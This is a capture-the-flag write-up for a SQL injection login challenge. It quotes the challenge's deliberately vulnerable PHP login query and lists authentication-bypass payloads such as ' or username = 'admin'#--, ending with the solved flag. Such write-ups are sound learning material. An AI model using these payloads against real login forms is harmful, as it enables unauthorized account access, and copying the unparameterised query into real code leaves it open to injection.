Description: Solved by 242 teams.

Hey I just learned this thing called MySQL! My admin account should be safe now!

This challenge is clearly telling us to spew SQLi all up in their db.

Going to the website and viewing the source code, we can see on the final line the following code snippet:

`<!-- source code at index.source.php -->`

Sweet, it looks like we have an indexed source code file that has the PHP code visible. The relevant code:
```
<?php

error_reporting(0);

if (isset($_POST['submit']) && isset($_POST['username']) && isset($_POST['password']) && $_POST['submit'] == "Login!") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    include("functions.php"); // connect to mysql server

    $query = "SELECT * FROM `users` WHERE username='$username' AND password='$password'";
    $result = mysql_query($query);
    $rows = array();
    while($row = mysql_fetch_array($result)) {
        $rows[] = $row;
    }
    if (count($rows) != 1) {
        echo "<div class='alert alert-danger'>No accounts found with that username. <a href='index.php'>Try again?</a></div>";
    } else {
        $row = $rows[0];
        echo "<div class='alert alert-success'>Welcome, <code>" . $row['username'] . "</code>! ";
        if ($row['username'] == "admin") {
            echo "Your flag is <code>$flag</code>.";
        }
        echo "</div>";
    }

} else {
    ?>
```

What we are really going to focus on is only the `SELECT` query:

```
$query = "SELECT * FROM `users` WHERE username='$username' AND password='$password'";
```

This challenge seemed pretty buggy and bitchy about how it wanted it to be solved. We obviously will use admin as the username, since it's a valid user in the table (according to the description). There are plenty of queries that I tried on the password field, which were definitely valid, but the server was neglecting to accept it.

For example:
`' OR 'a' = 'a'#--` `' OR 1=1/*` etc, etc

Eventually what I had to end up doing was comparing back to the username table again:
`' or username = 'admin'#--`

This makes our query:
```
$query = "SELECT * FROM `users` WHERE username='admin' AND password='' or username = 'admin'#=='"
```

The server hapilly accepts this query and responds accordingly with the `$flag` variable:

`Welcome, admin! Your flag is easyctf{54771309-67e5-4704-8743-6981a40b}.`
